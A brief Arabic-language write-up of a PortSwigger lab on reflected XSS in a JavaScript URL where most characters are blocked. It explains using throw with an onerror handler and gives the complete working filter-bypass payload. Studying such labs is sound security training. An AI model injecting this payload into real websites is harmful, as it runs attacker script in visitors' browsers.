# Lab : Reflected XSS in a JavaScript URL with some characters blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked

- الفكره من الLab ده انك تجد المكان المناسب الي تحط فيه الpayload وتعمل payload مع اعلم ان اغلب الcharacters معملها blocked

```bash
1. هنستخدم function الthrow دس بتهندل الerror يعني لو حصل error اعمل كذا ذي catch 

2. '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```
